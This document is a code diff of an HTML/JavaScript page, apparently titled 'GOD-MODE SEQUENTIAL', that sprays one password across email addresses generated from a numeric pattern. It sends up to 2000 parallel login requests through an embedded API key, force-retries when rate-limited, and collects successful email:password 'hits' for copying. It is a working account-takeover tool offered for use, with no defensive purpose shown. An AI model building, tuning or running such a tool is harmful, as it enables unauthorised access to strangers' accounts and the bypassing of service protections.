@@ -1,42 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>ULTRA-SONIC V8</title>
+    <title>GOD-MODE SEQUENTIAL V9</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { background: #000; color: #00ffff; font-family: 'Courier New', monospace; padding: 10px; text-align: center; }
-        .terminal { max-width: 550px; margin: auto; border: 2px solid #00ffff; background: #050505; padding: 20px; box-shadow: 0 0 50px #00ffff; border-radius: 5px; }
-        h1 { font-size: 18px; border-bottom: 1px solid #00ffff; padding-bottom: 10px; color: #fff; }
+        body { background: #000; color: #ff0000; font-family: 'Courier New', monospace; padding: 10px; text-align: center; margin: 0; }
+        .bot-terminal { max-width: 550px; margin: auto; border: 2px solid #ff0000; background: #050505; padding: 20px; box-shadow: 0 0 60px #ff0000; border-radius: 5px; }
+        h1 { font-size: 22px; border-bottom: 2px solid #ff0000; padding-bottom: 10px; color: #fff; text-shadow: 0 0 15px #ff0000; }
         
-        input { width: 100%; padding: 14px; margin: 8px 0; background: #111; border: 1px solid #00ffff; color: #fff; outline: none; box-sizing: border-box; font-size: 16px; }
-        .btn-sonic { width: 100%; padding: 20px; background: #00ffff; color: #000; border: none; font-weight: bold; font-size: 20px; cursor: pointer; margin-top: 10px; text-transform: uppercase; }
+        input { width: 100%; padding: 14px; margin: 8px 0; background: #111; border: 1px solid #ff0000; color: #fff; outline: none; box-sizing: border-box; font-size: 16px; text-align: center; }
+        .btn-god { width: 100%; padding: 22px; background: #ff0000; color: #fff; border: none; font-weight: bold; font-size: 22px; cursor: pointer; margin-top: 10px; text-transform: uppercase; box-shadow: 0 0 30px #ff0000; }
         
-        .monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; background: #000; padding: 15px; border: 1px dashed #00ffff; }
-        .monitor b { font-size: 30px; color: #fff; display: block; }
+        .monitor { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 20px 0; background: #000; padding: 15px; border: 1px dashed #ff0000; }
+        .monitor b { font-size: 34px; color: #fff; display: block; }
 
-        #speed-tag { font-size: 12px; color: #ff00ff; margin-bottom: 10px; font-weight: bold; }
-        #res-box { width: 100%; height: 300px; background: #000; color: #0f0; border: 1px solid #0f0; padding: 10px; font-size: 13px; box-sizing: border-box; }
+        #speed-meter { font-size: 14px; color: #ffff00; margin-bottom: 10px; font-weight: bold; background: #330000; padding: 5px; }
+        #res-box { width: 100%; height: 320px; background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 10px; font-size: 13px; box-sizing: border-box; }
         
-        .copy-btn { width: 100%; padding: 12px; background: #111; color: #00ffff; border: 1px solid #00ffff; margin-top: 10px; cursor: pointer; font-weight: bold; }
+        .copy-btn { width: 100%; padding: 12px; background: #111; color: #fff; border: 1px solid #ff0000; margin-top: 10px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="terminal">
-    <h1>⚡ ULTRA-SONIC RECOVERY</h1>
-    <div id="speed-tag">SPEED: 0 REQ/SEC</div>
+<div class="bot-terminal">
+    <h1>🔥 GOD-MODE SEQUENTIAL</h1>
+    <div id="speed-meter">WARMING UP ENGINES...</div>
     
     <input type="text" id="fmt" placeholder="FORMAT: USER_{6}_@GMAIL.COM">
     <input type="text" id="pwd" placeholder="PASSWORD">
     
-    <button class="btn-sonic" id="btn" onclick="igniteSonic()">🔥 IGNITE SONIC MODE</button>
+    <button class="btn-god" id="btn" onclick="igniteGodMode()">💀 LAUNCH OVERCLOCK</button>
 
     <div class="monitor">
         <div>CHECKED<b id="c_val">0</b></div>
         <div>FOUND<b id="f_val">0</b></div>
     </div>
 
-    <textarea id="res-box" readonly placeholder="Sequential Hits (Email:Pass)"></textarea>
+    <textarea id="res-box" readonly placeholder="Found List (100% Sequential)"></textarea>
     
     <button class="copy-btn" onclick="copyResults()">📋 COPY HITS</button>
 </div>
@@ -50,26 +50,27 @@
     let resultsMap = new Map();
     let startTime;
 
-    async function igniteSonic() {
+    async function igniteGodMode() {
         if (active) { location.reload(); return; }
         
         let fmt = document.getElementById('fmt').value.toUpperCase().trim();
         let pwd = document.getElementById('pwd').value.trim();
         let key = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";
 
-        if (!fmt.includes('{') || !pwd) return alert("Missing Data!");
+        if (!fmt.includes('{') || !pwd) return alert("MISSING DATA!");
 
         active = true;
         startTime = Date.now();
-        document.getElementById('btn').innerText = "🛑 TERMINATE";
-        document.getElementById('btn').style.background = "#f00";
+        document.getElementById('btn').innerText = "🛑 TERMINATE SYSTEM";
+        document.getElementById('btn').style.background = "#fff";
+        document.getElementById('btn').style.color = "#000";
         
         let digits = fmt.match(/\{(\d+)\}/)[1];
         let max = Math.pow(10, digits);
 
-        // --- ULTRA-CONCURRENCY: 800 PARALLEL RUNNERS ---
-        // സെക്കൻഡിൽ 100+ സ്പീഡ് കിട്ടാൻ 800 പാരലൽ വർക്കേഴ്സ് ആവശ്യമാണ്.
-        const workers = 800; 
+        // --- GOD-MODE OVERCLOCK: 2000 PARALLEL RUNNERS ---
+        // സെക്കൻഡിൽ 1000+ സ്പീഡ് ടാർഗെറ്റ് ചെയ്യാൻ 2000 പാരലൽ വർക്കേഴ്സ് ആവശ്യമാണ്.
+        const workers = 2000; 
 
         for (let i = 0; i < workers; i++) {
             (async function() {
@@ -83,13 +84,13 @@
             })();
         }
 
-        // സ്പീഡ് ട്രാക്കർ
+        // Real-time Speed Meter
         setInterval(() => {
             if (!active) return;
             let elapsed = (Date.now() - startTime) / 1000;
             let speed = Math.round(checked / elapsed);
-            document.getElementById('speed-tag').innerText = `SPEED: ${speed} REQ/SEC`;
-        }, 1000);
+            document.getElementById('speed-meter').innerText = `CURRENT SPEED: ${speed} REQ/SEC`;
+        }, 500);
     }
 
     async function processAcc(em, pw, k, idx) {
@@ -101,14 +102,13 @@
             });
             
             if (r.status === 429) {
-                return processAcc(em, pw, k, idx); // No-skip retry
+                return processAcc(em, pw, k, idx); // No-skip force retry
             }
 
             let d = await r.json();
             resultsMap.set(idx, { found: (d && d.idToken), email: em });
 
-            // --- STRICT SEQUENTIAL FLUSH ---
-            // 1, 2, 3... എന്ന പക്കാ ഓർഡറിൽ മാത്രം റിസൾട്ട് പുറത്തേക്ക് വിടുന്നു.
+            // --- INSTANT SEQUENTIAL FLUSH (1, 2, 3...) ---
             while (resultsMap.has(nextToFlush)) {
                 let data = resultsMap.get(nextToFlush);
                 if (data.found) {
@@ -119,14 +119,14 @@
                 }
                 
                 checked++;
-                document.getElementById('c_val').innerText = checked;
+                if (checked % 10 === 0) document.getElementById('c_val').innerText = checked;
                 
                 resultsMap.delete(nextToFlush);
                 nextToFlush++;
             }
 
         } catch (e) {
-            return processAcc(em, pw, k, idx); // Retry on network error
+            return processAcc(em, pw, k, idx); // Retry on any error
         }
     }
 
@@ -134,7 +134,7 @@
         let t = document.getElementById('res-box');
         t.select();
         document.execCommand('copy');
-        alert("Found List Copied!");
+        alert("COPIED TO CLIPBOARD!");
     }
 </script>
 
